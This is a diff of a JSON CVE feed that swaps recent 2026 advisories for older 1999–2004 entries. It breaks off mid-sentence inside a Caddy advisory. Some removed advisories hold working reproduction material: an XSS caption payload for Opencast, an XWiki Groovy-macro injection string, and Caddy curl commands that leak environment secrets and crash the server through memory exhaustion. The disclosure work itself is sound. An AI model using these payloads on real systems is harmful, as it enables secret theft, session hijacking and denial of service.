-      "summary": "The client for Symantec Norton AntiVirus Corporate Edition 7.5.x before 7.5.1 Build 62 and 7.6.x before 7.6.1 Build 35a runs winhlp32 with raised privileges, which allows local users to gain privileges by using certain features of winhlp32.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2003-03-31",
+      "id": "CVE-2000-1065",
+      "summary": "Vulnerability in IP implementation of HP JetDirect printer card Firmware x.08.20 and earlier allows remote attackers to cause a denial of service (printer crash) via a malformed packet.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-11",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0346.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0369.html",
-        "http://www.iss.net/security_center/static/10475.php",
-        "http://www.osvdb.org/6258",
-        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0346.html"
+        "http://marc.info/?l=bugtraq&m=97119729613778&w=2",
+        "http://www.securityfocus.com/bid/1775",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5354",
+        "http://marc.info/?l=bugtraq&m=97119729613778&w=2",
+        "http://www.securityfocus.com/bid/1775"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-1541",
-      "summary": "BadBlue 1.7 allows remote attackers to bypass password protections for directories and files via an HTTP request containing an extra / (slash).",
+      "id": "CVE-1999-1155",
+      "summary": "LakeWeb Mail List CGI script allows remote attackers to execute arbitrary commands via shell metacharacters in the recipient email address.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2003-03-31",
+      "published": "1998-11-09",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0041.html",
-        "http://www.iss.net/security_center/static/10466.php",
-        "http://www.securityfocus.com/bid/6044",
-        "http://archives.neohapsis.com/archives/vulnwatch/2002-q4/0041.html",
-        "http://www.iss.net/security_center/static/10466.php"
+        "http://lakeweb.com/scripts/",
+        "http://www.securityfocus.com/archive/1/11175",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1400",
+        "http://lakeweb.com/scripts/",
+        "http://www.securityfocus.com/archive/1/11175"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-93451",
-      "summary": "### Impact\n`Snappy.uncompressCharArray`, `uncompressShortArray`, `uncompressIntArray`, `uncompressLongArray`, `uncompressFloatArray` and `uncompressDoubleArray` sized the result array by dividing the declared uncompressed byte length by the element size, but native code wrote the full byte length. If the declared length is not a multiple of the element size, up to 7 bytes are written past the end of the Java array, corrupting the heap.\n\n### Patches\nFixed in 1.1.10.9 ([#739](https://github.com/xerial/snappy-java/pull/739)). These methods now reject uncompressed lengths that are not a multiple of the element size with `SnappyIOException`.\n\n### Workarounds\nCheck that `Snappy.uncompressedLength(input)` is a multiple of the element size before calling these methods.",
+      "id": "CVE-1999-1289",
+      "summary": "ICQ 98 beta on Windows NT leaks the internal IP address of a client in the TCP data segment of an ICQ packet instead of the public address (e.g. through NAT), which provides remote attackers with potentially sensitive information about the client or the internal network configuration.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-10-27",
-      "modified": "2026-10-27",
-      "cwe": {
-        "cwe_id": "CWE-193",
-        "name": "Off-by-one Error"
-      },
-      "references": [
-        "https://github.com/xerial/snappy-java/security/advisories/GHSA-gwq9-9ffj-mvrv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-93451",
-        "https://github.com/xerial/snappy-java/issues/729",
-        "https://github.com/xerial/snappy-java/pull/739",
-        "https://github.com/xerial/snappy-java/commit/943c6043a292568575e8347af4507d015e802c75"
-      ],
-      "vulnerableProducts": [
-        "org.xerial.snappy:snappy-java maven"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-119282",
-      "summary": "## Summary\n\n`@nx/maven` and `@nx/gradle` spawn their project-graph analyzers through a shell and interpolate plugin options read from `nx.json` straight into the command line. Because a shell parses the whole line, an option value containing shell syntax is executed as a command by any `nx` command that constructs the project graph. Anyone who clones a hostile repository, or who checks out a pull request that edits `nx.json`, runs the injected command with their own privileges.\n\n## Severity\n\nA victim who runs an ordinary `nx` command in an attacker-supplied Maven or Gradle workspace gets code execution as themselves. In most such workspaces an attacker who can write `nx.json` can already run code through the repository's build files (`./mvnw`, `pom.xml`, and the Gradle equivalents), so the genuinely new exposure is narrow — for example CI building a fork's pull request where `nx.json` is writable but the build files are not. We have no evidence of exploitation in the wild.\n\n## Affected & Patched Versions\n\n| Package | Vulnerable | Patched |\n| --- | --- | --- |\n| `@nx/maven` | `>= 22.0.2, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |\n| `@nx/gradle` | `>= 21.0.0, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |\n\n> [!IMPORTANT]\n> Workspaces that register neither `@nx/maven` nor `@nx/gradle` in `nx.json` are unaffected — the vulnerable code only runs from those plugins' graph-construction paths, and no other Nx plugin shares this pattern.\n\n## Remediation\n\nUpgrade to **22.7.9** (22.x line) or **23.1.2** (23.x line) or later:\n\n```\nnx migrate 23.1.2\n```\n\nUpgrade both `nx` and the affected plugin (`@nx/maven` and/or `@nx/gradle`). The plugin's fix depends on code that ships in the `nx` package, so bumping the plugin without a matching `nx` upgrade will not resolve it.\n\nThere is no configuration to change — upgrading is the whole fix. If you cannot upgrade yet, only run `nx` commands in repositories you trust, since a malicious `nx.json` can execute code on a vulnerable version.\n\n## Details\n\nBoth plugins spawn their analyzer through a shell and interpolate `nx.json` plugin options into the command, so those option values are shell source. For Maven the injectable value is the `targetNamePrefix` option; for Gradle it is broader, since every plugin option is mapped into a `-P` argument and arbitrary option names are accepted, making both the name and value of any option injectable.\n\n## Credits\n\n- **Arkadiusz Marta** (RE:SOURCE) — Reporter",
-      "cvssScore": 7.3,
-      "severity": "High",
-      "published": "2026-10-30",
-      "modified": "2026-10-30",
-      "cwe": {
-        "cwe_id": "CWE-78",
-        "name": "Improper Neutralization of Special Elements used in an OS Command"
-      },
-      "references": [
-        "https://github.com/nrwl/nx/security/advisories/GHSA-qm8w-vx34-5j9j",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-119282",
-        "https://github.com/nrwl/nx/pull/36626",
-        "https://github.com/nrwl/nx/commit/02c5d59e8dbbbe30963c0181c6a22cd8c1190a25",
-        "https://github.com/nrwl/nx/commit/60196b7cfcffcada35b6b90e53bf1a78d049b548"
-      ],
-      "vulnerableProducts": [
-        "@nx/maven npm",
-        "@nx/gradle npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-86987",
-      "summary": "An authorization issue was addressed with improved entitlement checks. This issue is fixed in iOS 27.2 and iPadOS 27.2. A remote attacker may be able to access sensitive user data.",
-      "cvssScore": 5.5,
-      "severity": "Medium",
-      "published": "2026-10-26",
+      "published": "1998-11-11",
       "modified": null,
-      "cwe": "CWE-862",
+      "cwe": null,
       "references": [
-        "https://support.apple.com/en-us/149230"
+        "http://www.securityfocus.com/archive/1/11233",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1398",
+        "http://www.securityfocus.com/archive/1/11233",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1398"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-76287",
-      "summary": "In Splunk Enterprise versions below 10.4.4, a user that holds a role with the preview_data_management_pipeline capability or edit_data_management_pipeline_job capability could read or delete Data Management SPL2 preview jobs and results outside their ownership scope.\nThe vulnerability is possible because the Data Management Representational State Transfer (REST) API verifies the required capability but does not verify that the requested preview job belongs to the requester.\nThe affected Data Management REST API is available only when the Edge Processor feature is turned on. The Edge Processor feature is turned off by default.\nFor more information see Set up a data management control plane (https://help.splunk.com/en/splunk-enterprise/process-data-at-the-edge/use-edge-processors-for-splunk-enterprise/10.4/getting-started/set-up-a-data-management-control-plane) and Getting sample data for previewing data transformations (https://help.splunk.com/en/splunk-enterprise/process-data-at-the-edge/use-edge-processors-for-splunk-enterprise/10.4/working-with-pipelines/getting-sample-data-for-previewing-data-transformations) in the Splunk documentation.",
-      "cvssScore": 5.4,
-      "severity": "Medium",
-      "published": "2026-10-21",
-      "modified": null,
-      "cwe": "CWE-639",
-      "references": [
-        "https://advisory.splunk.com/advisories/SVD-2026-1007"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-76288",
-      "summary": "In Splunk Enterprise versions below 10.4.4, 10.2.8, 10.0.11, and 9.4.16, an unauthenticated user could send a single crafted request to the Splunk Web JavaScript logger endpoint and cause Splunk Web to stop responding to requests. Splunk Web remains unavailable until Splunk Enterprise is restarted.\nThe vulnerability is possible because Splunk Web does not limit request-header parsing before processing the request.",
+      "id": "CVE-1999-0057",
+      "summary": "Vacation program allows command execution by remote users through a sendmail command.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-10-21",
-      "modified": null,
-      "cwe": "CWE-400",
-      "references": [
-        "https://advisory.splunk.com/advisories/SVD-2026-1007"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-76289",
-      "summary": "In Splunk Enterprise versions below 10.4.4, 10.2.8, 10.0.11, and 9.4.16, a user who does not hold the \"admin\" or \"power\" Splunk roles could make the Splunk Enterprise instance unavailable to other users by sending a request to the Representational State Transfer (REST) API endpoint for lookup table files. The affected instance requires a restart to restore service.\nThe vulnerability is possible because the endpoint does not limit resource use when it processes response field selections.\nFor more information see Endpoints reference list (https://help.splunk.com/en/splunk-enterprise/rest-api-reference/10.4/introduction/endpoints-reference-list) and About configuring role-based user access (https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/manage-splunk-platform-users-and-roles/about-configuring-role-based-user-access) in the Splunk documentation.",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2026-10-21",
-      "modified": null,
-      "cwe": "CWE-770",
-      "references": [
-        "https://advisory.splunk.com/advisories/SVD-2026-1007"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1118",
-      "summary": "ndd in Solaris 2.6 allows local users to cause a denial of service by modifying certain TCP/IP parameters.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "1998-03-11",
+      "published": "1998-11-16",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/165&type=0&nav=sec.sba",
-        "http://www.securityfocus.com/bid/433",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/817",
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/165&type=0&nav=sec.sba",
-        "http://www.securityfocus.com/bid/433"
+        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9811-087",
+        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9811-087"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1499",
-      "summary": "named in ISC BIND 4.9 and 8.1 allows local users to destroy files via a symlink attack on (1) named_dump.db when root kills the process with a SIGINT, or (2) named.stats when SIGIOT is used.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "1998-04-10",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/archive/1/8966",
-        "http://www.securityfocus.com/bid/80",
-        "http://www.securityfocus.com/archive/1/8966",
-        "http://www.securityfocus.com/bid/80"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2025-53837",
-      "summary": "### Impact\nAny user who can edit their own user profile or any other document can execute arbitrary script macros including Groovy and Python macros that allow remote code execution including unrestricted read and write access to all wiki contents. The reason is that rendering output is included as content of HTML macros without further escaping and it is thus possible to close the HTML macro and inject script macros that are executed with programming rights.\n\nThis can be demonstrated by adding an object of type `XWiki.UIExtensionClass` to a document with content `{{html wiki=\"true\"}}~{~{~/~h~t~m~l~}~}~ ~{~{~c~a~c~h~e~}~}~{~{~g~r~o~o~v~y~}~}~p~r~i~n~t~l~n~(~1~)~{~{~/~g~r~o~o~v~y~}~}~{~{~/~c~a~c~h~e~}~}{{/html}}`, extension point id `org.xwiki.platform.html.head`, extension id `org.xwiki.myuser.test` and extension scope \"current user\". When opening `<xwiki-server>/xwiki/bin/view/Main/?sheet=CKEditor.ContentSheet&xpage=plain` where `<xwiki-server>` is the URL of the XWiki installation, the output should start with `{{/html}} {{cache}}{{groovy}}println(1){{/groovy}}{{/cache}}` and not with ` 1</p>`.\n\nThis escaping was always missing at least in XWiki syntax version 2, it is definitely exploitable in XWiki 3.3 Milestone 1 via the user profile (not through extension points), though this has also been fixed by a separate patch, see the [advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-x764-ff8r-9hpx). Exploitable extension points include [`org.xwiki.platform.search.ui.docdoesnotexist`](https://www.xwiki.org/xwiki/bin/view/Documentation/DevGuide/ExtensionPoint/Suggestions%20for%20Document%20Does%20Not%20Exist/) which has been added in XWiki 8.3 Milestone 1.\n\n### Patches\nThis has been patched in XWiki 14.10.2 and 15.0 RC1 by making sure that rendering output cannot close the surrounding HTML macro.\n\n### Workarounds\nIt is in principle possible to add escaping to all places where rendering output is used in wiki documents but at the moment there is no list of them.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n* Email us at [Security Mailing List](mailto:security@xwiki.org)",
-      "cvssScore": 9.9,
+      "id": "CVE-2004-0385",
+      "summary": "Heap-based buffer overflow in Oracle 9i Application Server Web Cache 9.0.4.0.0, 9.0.3.1.0, 9.0.2.3.0, and 9.0.0.4.0 allows remote attackers to execute arbitrary code via a long HTTP request method header to the Web Cache listener.  NOTE: due to the vagueness of the Oracle advisory, it is not clear whether there are additional issues besides this overflow, although the advisory alludes to multiple \"vulnerabilities.\"",
+      "cvssScore": 10,
       "severity": "Critical",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-95",
-        "name": "Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
-      },
+      "published": "2004-06-01",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/xwiki/xwiki-rendering/security/advisories/GHSA-26vp-8gxg-v4pg",
-        "https://github.com/xwiki/xwiki-rendering/commit/92bc8095ed3acce15ab200c8525e1623b4898be5",
-        "https://github.com/xwiki/xwiki-rendering/releases/tag/xwiki-rendering-14.10.2",
-        "https://github.com/xwiki/xwiki-rendering/releases/tag/xwiki-rendering-15.0-rc-1",
-        "https://jira.xwiki.org/browse/XRENDERING-693"
+        "http://archives.neohapsis.com/archives/vulnwatch/2004-q1/0078.html",
+        "http://marc.info/?l=bugtraq&m=107945649127635&w=2",
+        "http://marc.info/?l=bugtraq&m=108144419001770&w=2",
+        "http://otn.oracle.com/deploy/security/pdf/2004alert66.pdf",
+        "http://secunia.com/advisories/11118"
       ],
-      "vulnerableProducts": [
-        "org.xwiki.rendering:xwiki-rendering-xml maven"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-77615",
-      "summary": "## Summary\n\nThe Opencast Paella player renders caption cue text into `innerHTML` without escaping. The captions canvas clears `_captionsContainer.innerHTML` and then appends each active cue with `_captionsContainer.innerHTML += cue`, so HTML inside a WebVTT or DFXP cue becomes live DOM and executes in the Opencast origin.\n\nThe caption track is read from any media package element with a `captions/*` flavor and is served, with the player manifest, to anonymous viewers through `/search/episode.json`. The caption plugins that consume it are enabled in the default player configuration, the \"Subtitles\" upload that produces a `captions/source` track is active by default, and no caption processing step escapes the cue text.\n\nA user who can upload a subtitle to an event and publish it stores the payload in the published caption file. Any viewer who opens the event and turns captions on runs the script.\n\nResult: a non-admin content author stores JavaScript in a subtitle cue that executes in the browser session of every viewer who enables captions on that event, including anonymous viewers and authenticated staff.\n\n## Affected\n\nopencast/opencast, `engage-paella-player` module. Supported release lines 19.x and 20.x are affected (and 18.x). Live-confirmed on 18.8 (Paella 7, paella-core 1.50.2) and 20.0 (Paella 8, paella-core 1.50.4); 19.5 ships the code-identical caption path (paella-core 1.50.4, same `EpisodeConversor` and default plugin config as 20.0). The captions canvas uses the same `innerHTML += cue` sink across these versions.\nDefault configuration: the WebVTT and DFXP caption plugins are `enabled: true` in `etc/ui-config/mh_default_org/paella7/config.json`, the \"Subtitles\" upload option (`captions/source`, `.vtt`) is active in `etc/listproviders/event.upload.asset.options.properties`, and the `fast` workflow publishes `captions/*` to the engage player.\nCondition: an event with a caption track published to the engage player. No non-default flag required.\n\n## Root cause\n\nThe captions canvas appends each cue to `_captionsContainer.innerHTML` in the bundled paella-core (served at `/paellaN/ui/paella-player.js` / the 20.x core chunk), so markup in a cue becomes live DOM. The caption entry is built from any media package element whose flavor matches `captions/*` at `modules/engage-paella-player-7/src/js/EpisodeConversor.js:392`, and `/search/episode.json` serves the manifest and the caption file to anonymous clients. The WebVTT and DFXP plugins that consume it are enabled by default at `etc/ui-config/mh_default_org/paella7/config.json:571` and `:574`. The cue text is not HTML-escaped before assignment to `innerHTML`, and `partial-process-uploaded-captions` only cuts and tags the file, it never sanitizes it. Opencast sets neither a Content-Security-Policy nor an X-Content-Type-Options header, so the injected script runs without restriction.\n\n## Reproduction\n\nDefault config, default caption plugins enabled, a non-admin user with `ROLE_API_EVENTS_CREATE`, `ROLE_API_EVENTS_TRACK_EDIT`, and `ROLE_UI_TASKS_CREATE` (no `ROLE_ADMIN`).\n\n1. As the non-admin user, create an event, then upload a WebVTT subtitle as `captions/source` whose cue text is an XSS payload, and publish the event.\n\n```\nWEBVTT\n\n00:00:00.000 --> 00:00:30.000\n<img src=x onerror=document.title=window.__xss=document.domain>\n```\n\n2. The anonymous search manifest then exposes the caption and serves the cue raw.\n\n```\nGET /search/episode.json?id=<event>\n\"type\":\"captions/source\", \"url\":\".../static/.../x.vtt\"\nGET .../static/.../x.vtt  ->  cue text returned verbatim\n```\n\n3. Open the event in the player as an anonymous viewer, open the captions menu, and select the track; the cue is written to `innerHTML` and the `onerror` handler runs.\n\nLive-verified: on Opencast 18.8 (build 8705223) in Chrome, a non-admin author published the subtitle and an anonymous viewer enabled captions, rendering the cue as a live `<img>` node and setting `window.__xss` and `document.title` to `document.domain`. On Opencast 20.0 (build d919405, Paella 8), the served core bundle contains the identical `innerHTML += cue` sink and the player loads the cue raw; the sink executes JavaScript in the engage origin when fed the player's own published caption file.\n\n## Impact\n\n- JavaScript execution in the Opencast origin in the session of any viewer who enables captions on the event.\n- Anonymous viewers and authenticated staff are equally affected; an instructor or admin viewer exposes that session context to the script.\n- Session and CSRF-token theft, actions performed as the victim against the Opencast REST API.\n- Stored by a non-admin content author, triggered by viewing with captions on, no attacker authentication at view time.\n\n## Credit\n\nJan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)",
-      "cvssScore": 8.7,
+      "id": "CVE-1999-0200",
+      "summary": "Windows NT FTP server (WFTP) with the guest account enabled without a password allows an attacker to log into the FTP server using any username and password.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.microsoft.com/technet/support/kb.asp?ID=137853",
+        "http://www.microsoft.com/technet/support/kb.asp?ID=137853"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0436",
+      "summary": "MetaProducts Offline Explorer 1.2 and earlier allows remote attackers to access arbitrary files via a .. (dot dot) attack.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-05-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0254.html",
+        "http://www.metaproducts.com/mpOE-HY.html",
+        "http://www.securityfocus.com/bid/1231",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0254.html",
+        "http://www.metaproducts.com/mpOE-HY.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0451",
+      "summary": "The Intel express 8100 ISDN router allows remote attackers to cause a denial of service via oversized or fragmented ICMP packets.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-05-19",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0229.html",
+        "http://www.securityfocus.com/bid/1228",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-05/0229.html",
+        "http://www.securityfocus.com/bid/1228"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0431",
+      "summary": "Cobalt RaQ2 and RaQ3 does not properly set the access permissions and ownership for files that are uploaded via FrontPage, which allows attackers to bypass cgiwrap and modify files.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/opencast/opencast/security/advisories/GHSA-m6c8-jcw2-5r25",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-77615",
-        "https://github.com/opencast/opencast/pull/7736",
-        "https://github.com/opencast/opencast/commit/701682c635f668228c3e8fb7b4564b3294788e40",
-        "https://github.com/polimediaupv/paella-core/commit/94a36490808ac5a1f60a0745d71ec9253f6d206b"
-      ],
-      "vulnerableProducts": [
-        "org.opencastproject:opencast-engage-paella-player-7 maven",
-        "paella-core npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77281",
-      "summary": "# Caddy v2.11.3 — Three vulnerabilities in handler/placeholder layer\n\n**Tested against:** `caddy:2.11.3` (official Docker image, SHA verified at runtime)\n**Reproduction environment:** Docker Desktop 4.73.1 / Engine 29.4.3 on Windows 10 host, isolated containers, no network egress required for any of the exploits\n\nThis advisory bundles three independent issues discovered together during a source review of the placeholder/replacer layer. Each issue has been reproduced end-to-end against the unmodified `caddy:2.11.3` image with the minimal Caddyfile that the documentation suggests for the affected feature.\n\n## Issue 1: Rewrite handler — placeholder double-expansion enables env var / file disclosure\n\n**File:** `modules/caddyhttp/rewrite/rewrite.go:215-249` and `buildQueryString` at `327`\n**Class:** CWE-94 (Code Injection), same bug class as CVE-2026-30852 (`vars_regexp`)\n**Severity:** Low (requires operator config with trailing `?` in rewrite URI)\n\n### Root cause\n\nWhen the operator's `rewrite` URI template:\n1. Contains a placeholder that resolves to request data (e.g. `{http.request.header.X-Foo}`), AND\n2. Ends with a literal `?` (with empty query side)\n\n…then the bytes produced by the **first** Replacer pass (which include attacker-controlled header values) are fed through `buildQueryString`, which runs a **second** Replacer pass and resolves any placeholders the attacker injected.\n\n```go\n// rewrite.go (abridged)\nnewPath = repl.ReplaceAll(path, \"\")            // pass 1 — header expanded\nif before, after, found := strings.Cut(newPath, \"?\"); found {\n    var injectedQuery string\n    newPath, injectedQuery = before, after\n    if query == \"\" {                            // trailing-? branch\n        query = injectedQuery                   // attacker bytes flow into 'query'\n    }\n}\nif query != \"\" {\n    newQuery = buildQueryString(query, repl)    // pass 2 — RE-EXPANDS attacker input\n}\n```\n\nThis is the same gadget that was patched in `vars_regexp` (CVE-2026-30852). The fix did not extend to `rewrite`, and there is no equivalent regression test for it in `rewrite_test.go` (compare `vars_test.go:63,69,75`).\n\n### Reproduction (real Caddy 2.11.3)\n\n`Caddyfile`:\n```\n{\n    admin off\n    auto_https off\n}\n\n:8080 {\n    rewrite * /serve/{http.request.header.X-Fwd}?\n    respond \"PATH={path} QUERY={query}\"\n}\n```\n\n`docker-compose.yml`:\n```yaml\nservices:\n  caddy:\n    image: caddy:2.11.3\n    environment:\n      DATABASE_URL: \"postgres://leaked:supersecret@dbserver/production\"\n    ports: [\"8080:8080\"]\n    volumes: [\"./Caddyfile:/etc/caddy/Caddyfile:ro\"]\n```\n\nExploit:\n```\n$ docker compose up -d\n$ curl \"http://localhost:8080/anything\" -H \"X-Fwd: foo?{env.DATABASE_URL}=leak\"\nPATH=/serve/foo QUERY=postgres%3A%2F%2Fleaked%3Asupersecret%40dbserver%2Fproduction=leak\n```\n\nURL-decoded query: `postgres://leaked:supersecret@dbserver/production=leak`. The `DATABASE_URL` env var has been exfiltrated into the request URL, where it will appear in access logs, get forwarded to upstreams via `reverse_proxy`, and be readable via `{http.request.uri.query}` in any downstream handler.\n\n### Available read primitives\n\nThe same gadget exposes any placeholder the attacker can name in their injected substring:\n- `{env.X}` — any env var on the Caddy process\n- `{file./path}` — any file readable by the Caddy process (if `file` provider is registered)\n- `{vars.X}` — Caddy-internal request variables\n\n### Suggested fix (mirrors the CVE-2026-30852 patch)\n\nAfter splitting at `?`, sanitize placeholder syntax in the injected query before passing it to `buildQueryString`:\n\n```go\nif before, after, found := strings.Cut(newPath, \"?\"); found {\n    var injectedQuery string\n    newPath, injectedQuery = before, after\n    if query == \"\" {\n        injectedQuery = strings.ReplaceAll(injectedQuery, \"{\", \"%7B\")\n        injectedQuery = strings.ReplaceAll(injectedQuery, \"}\", \"%7D\")\n        query = injectedQuery\n    }\n}\n```\n\nAlso recommend adding equivalent regression tests in `rewrite_test.go` to the three \"is not re-expanded\" tests in `vars_test.go`.\n\n## Issue 2: Unbounded body buffer via `{http.request.body}` placeholder — memory exhaustion DoS\n\n**File:** `modules/caddyhttp/replacer.go:217-245` (placeholder resolution for `http.request.body`)\n**Class:** CWE-770 (Allocation of Resources Without Limits)\n**Severity:** Moderate (any operator using the documented `log_append body {http.request.body}` pattern is vulnerable)\n\n### Root cause\n\nWhen any handler references the `{http.request.body}` placeholder, the replacer code path reads the entire request body into a byte slice via `io.Copy(buf, req.Body)` with **no `LimitReader`** wrapping. The `needsEarly` flag bypasses the `request_body` middleware's size limit, because the placeholder is resolved before that middleware sees the request.\n\nThis means an attacker can send a request body of any size (up to whatever `Content-Length` they declare, or unlimited chunked) and Caddy will buffer all of it into RAM before any size check fires.\n\n### Reproduction (real Caddy 2.11.3, 512 MB container cap)\n\n`Caddyfile`:\n```\n{\n    admin off\n    auto_https off\n}\n\n:8080 {\n    log_append body {http.request.body}\n    respond \"OK, length received: {http.request.header.Content-Length}\"\n}\n```\n\n`docker-compose.yml`:\n```yaml\nservices:\n  caddy:\n    image: caddy:2.11.3\n    mem_limit: 512m\n    memswap_limit: 512m\n    ports: [\"8080:8080\"]\n    volumes: [\"./Caddyfile:/etc/caddy/Caddyfile:ro\"]\n```\n\nExploit (Windows PowerShell):\n```\nPS> fsutil file createnew big.bin 1073741824\nFile C:\\caddy-verify\\test3-body-dos\\big.bin is created\nPS> curl.exe -X POST --data-binary \"@big.bin\" -H \"Expect:\" --max-time 120 http://localhost:8080/\ncurl: (28) Operation timed out after 120010 milliseconds with 0 bytes received\n```\n\nContainer state immediately after:\n```\nPS> docker ps -a --filter name=caddy-verify-3\nCONTAINER ID   IMAGE         STATUS                       NAMES\n7f8ba392e7b5   caddy:2.11.3  Exited (137) 2 minutes ago   caddy-verify-3\n\nPS> docker inspect caddy-verify-3 --format \"ExitCode={{.State.ExitCode}} OOMKilled={{.State.OOMKilled}}\"\nExitCode=137 OOMKilled=true\n```\n\n`OOMKilled=true` is dispositive — the Linux kernel's OOM killer fired. Caddy's logs cut off cleanly after `\"serving initial configuration\"` with no error message, which is the signature of a process killed mid-allocation by SIGKILL.\n\nA small body works fine:\n```\n$ curl -X POST -d \"hello world\" http://localhost:8080/\nOK, length received: 11\n```\n\n### Real-world exploitability\n\nThe `log_append body {http.request.body}` pattern is in Caddy's documentation as a debugging aid for request troubleshooting and is widely used. Other affected configurations include CEL matchers like `expression {http.request.body}.contains('admin')`, custom header forwarding with `header_up X-Original-Body {http.request.body}`, and any third-party module that resolves the placeholder.\n\nContainer memory limits in Docker / Kubernetes will result in OOM-kills as shown above; on bare-metal Caddy without cgroup limits, the attacker can exhaust all host RAM and trigger swap thrashing or system-wide instability.\n\n### Suggested fix\n\nWrap the body read with a `LimitReader` keyed off either:\n1. The operator's configured `request_body.max_size` (if set), or\n2. A sane built-in default (proposal: 10 MB), with an opt-out / opt-up directive for operators who genuinely need to log large bodies.\n\nIf the placeholder is referenced and the body exceeds the limit, the placeholder should resolve to a truncation marker or empty string, and a warning should be logged.\n\n## Issue 3: `fileHidden()` case-sensitive pattern bypass — exposes \"hidden\" files via case variation\n\n**File:** `modules/caddyhttp/fileserver/staticfiles.go:669-718` (the `fileHidden` function and `filepath.Match` call)\n**Class:** CWE-178 (Improper Handling of Case Sensitivity)\n**Severity:** Moderate (affects all macOS deployments, all Windows deployments, and any Linux deployment where mixed-case directories exist)\n\n### Root cause\n\n`fileHidden()` uses `filepath.Match`, which is **case-sensitive**. However:\n- **macOS APFS** is case-insensitive by default\n- **Windows NTFS** is case-insensitive by default\n- **Linux ext4** can be configured with the `casefold` flag, and even without it, build pipelines / backup restores / typos can create same-name-different-case directories side by side\n\nOn a case-insensitive filesystem, the OS resolves `/.git` and `/.GIT` to the same directory, but Caddy's hide check only fires on the exact-case literal `.git`. Result: the file is served via the uppercase URL.\n\nOn a case-sensitive filesystem where both `.git` and `.GIT` exist as separate directories, Caddy hides only `.git` and exposes `.GIT`.\n\n### Reproduction (real Caddy 2.11.3)\n\n`Caddyfile`:\n```\n{\n    admin off\n    auto_https off\n}\n\n:8080 {\n    root * /srv\n    file_server {\n        hide .git .env secrets\n    }\n}\n```\n\nSetup: create six files inside the container (an Alpine setup container writes them so the case-distinct directories survive on the case-sensitive ext4 inside the Linux 